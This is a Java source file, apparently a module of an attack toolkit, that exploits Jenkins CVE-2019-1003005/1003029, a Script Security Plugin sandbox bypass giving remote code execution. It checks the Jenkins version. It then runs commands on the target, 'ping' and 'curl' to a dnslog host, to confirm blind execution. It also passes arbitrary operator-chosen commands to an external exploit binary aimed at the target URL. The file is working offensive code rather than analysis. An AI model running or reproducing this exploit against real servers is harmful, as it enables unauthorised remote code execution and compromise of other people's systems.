package fun.fireline.exp.jenkins;

import fun.fireline.core.ExploitInterface;
import fun.fireline.exp.tools.dnslogSetting;
import fun.fireline.tools.Jenkins_Info;

import java.io.IOException;

import static fun.fireline.tools.Tools.*;

public class CVE_2019_1003005 implements ExploitInterface {

    private String url = "";
    private boolean isVul = false;
    private Jenkins_Info jenkins_info = new Jenkins_Info();
    private dnslogSetting dnslogSetting = new dnslogSetting();

    @Override
    public String checkVul(String url) {
        this.url = url;
        String version = jenkins_info.get_Jenkions_Info(url);
        if(version==null){
            return "[-] 目标非Jenkins";
        }
        String dnslog = dnslogSetting.getDomain();
        if(dnslog==null){
            return "请进行dnslog配置";
        }
        String basic = "CVE-2019-1003005/CVE-2019-1003029 无回显远程代码执行(Script Security Plugin沙箱绕过),请从文件读取/命令执行模块自行判断 eg: curl dnslog.cn (command)";
        if(compare2(version,"2.53")==0||compare2(version,"2.122")==0||compare2(version,"2.137")==0||compare2(version,"2.138")==0||compare2(version,"2.152")==0||compare2(version,"2.153")==0){
            String random = getRandomString(3);
            this.isVul = true;
            this.exeCmd("ping -w 1 "+random+"."+dnslog,"UTF-8");
            if(dnslog_verify(dnslogSetting,random)){
                return "[+] 目标版本处于漏洞版本之内, 且经过dnslog api测试, 可能存在"+basic;
            }else {
                //排除目标有curl无ping命令的情况
                this.exeCmd("curl "+random+"."+dnslog,"UTF-8");
                if(dnslog_verify(dnslogSetting,random)){
                    return "[+] 经过dnslog api测试, "+basic;
                }else {
                    return "[?] 目标版本处于漏洞版本之内, 但未经过dnslog api测试, 可能是api限制请求频率,dnslog日志累计过多,目标不出网,当前网络不流畅等原因, 不一定不存在漏洞 " + basic;
                }
            }
        }
        return "[-] 目标版本处于漏洞版本之外, 不存在"+basic;
    }

    @Override
    public String exeCmd(String cmd, String encoding) {
        String os = jenkins_info.getSystem();
        String exp = "";
        if(os.contains("win")){
            exp = "CVE_2019_1003005.exe";
        }else{
            exp = "./CVE_2019_1003005";
        }
        try {
            String command = String.format("%s %s \"%s\"",exp,this.url,cmd);
            Process process = Runtime.getRuntime().exec(command);
            System.out.println("exp: "+command);
            process.waitFor();
        } catch (InterruptedException | IOException e) {
            e.printStackTrace();
        }
        return "无回显命令执行,请自行验证";
    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }
}